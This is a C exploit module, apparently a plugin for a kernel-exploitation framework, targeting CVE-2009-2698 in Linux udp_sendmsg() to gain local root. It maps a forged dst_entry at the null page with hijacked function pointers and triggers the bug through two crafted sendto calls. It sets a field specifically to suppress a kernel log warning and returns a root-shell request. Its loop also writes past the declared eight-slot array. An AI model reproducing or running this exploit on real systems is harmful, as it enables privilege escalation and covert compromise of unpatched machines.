/* the rebel */
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include "exp_framework.h"

struct dst_entry {
	void *next;
	int refcnt;
	int use;
	void *child;
	void *dev;
	short error;
	short obsolete;
	int flags;
	unsigned long lastuse;
	unsigned long expires;
	unsigned short header_len;
	unsigned short trailer_len;
	unsigned int metrics[13];
	/* need to have this here and empty to avoid problems with 
	   dst.path being used by dst_mtu */
	void *path;
	unsigned long rate_last;
	unsigned long rate_tokens;
	/* things change from version to version past here, so let's do this: */
	void *own_the_kernel[8];
};

struct exploit_state *exp_state;

char *desc = "The Rebel: Linux < 2.6.19 udp_sendmsg() local root";
char *cve = "CVE-2009-2698";

int get_exploit_state_ptr(struct exploit_state *ptr)
{
	exp_state = ptr;
	return 0;
}

int requires_null_page = 1;

int prepare(unsigned char *ptr)
{
	struct dst_entry *mem = (struct dst_entry *)ptr;
	int i;

	/* for stealthiness based on reversing, makes sure that frag_off
	   is set in skb so that a printk isn't issued alerting to the 
	   exploit in the ip_select_ident path
	*/
	mem->metrics[1] = 0xfff0;
	/* the actual "output" function pointer called by dst_output */
	for (i = 0; i < 10; i++)
		mem->own_the_kernel[i] = exp_state->own_the_kernel;

	return 0;
}

int trigger(void)
{
	struct sockaddr sock = {
		.sa_family = AF_UNSPEC,
		.sa_data = "CamusIsAwesome",
	};
	char buf[1024] = {0};
	int fd;

	fd = socket(PF_INET, SOCK_DGRAM, 0);
	if (fd < 0) {
		fprintf(stdout, "failed to create socket\n");
		return 0;
	}
		
	sendto(fd, buf, 1024, MSG_PROXY | MSG_MORE, &sock, sizeof(sock));
	sendto(fd, buf, 1024, 0, &sock, sizeof(sock));

	return 1;
}

int post(void)
{
	return RUN_ROOTSHELL;
}
